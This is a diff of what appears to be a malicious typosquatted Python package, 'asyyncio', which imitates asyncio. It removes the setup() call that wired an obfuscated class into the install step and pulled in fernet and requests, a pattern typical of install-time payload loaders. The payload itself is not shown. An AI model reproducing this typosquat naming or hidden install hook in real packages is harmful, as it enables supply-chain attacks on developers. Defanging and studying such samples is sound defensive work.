@@ -18,22 +18,5 @@ class bGwvXPiEEvOHwDsGBcbcEILVTDnuMxhqvmtadoMcTbBfnUyIWkWBWfgfMEEYLkNPTPkeRlOVbB
             install.run(self)
 
 
-setup(
-    name="asyyncio",
-    version=VERSION,
-    author="uUzkxwgrXfHSxjdLI",
-    author_email="geYkFWSafwRLIXjqgJ@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': bGwvXPiEEvOHwDsGBcbcEILVTDnuMxhqvmtadoMcTbBfnUyIWkWBWfgfMEEYLkNPTPkeRlOVbByp,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
